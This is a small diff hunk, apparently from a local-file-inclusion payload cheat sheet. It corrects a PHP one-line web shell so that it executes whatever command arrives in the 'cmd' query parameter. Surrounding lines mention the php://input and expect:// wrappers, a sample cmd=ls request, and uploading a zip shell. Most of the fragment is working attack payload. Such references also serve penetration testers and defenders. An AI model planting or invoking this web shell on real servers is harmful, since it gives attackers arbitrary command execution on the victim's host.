@@ -116,7 +116,7 @@ expect://<command>
 page=php://input&cmd=ls  
 in POST request  
 ```php
-<?php echo shell_exec($GET_['cmd']);?>  
+<?php echo shell_exec($_GET['cmd']);?>  
 ```
 Upload Zip shell file and extract with zip
 ```
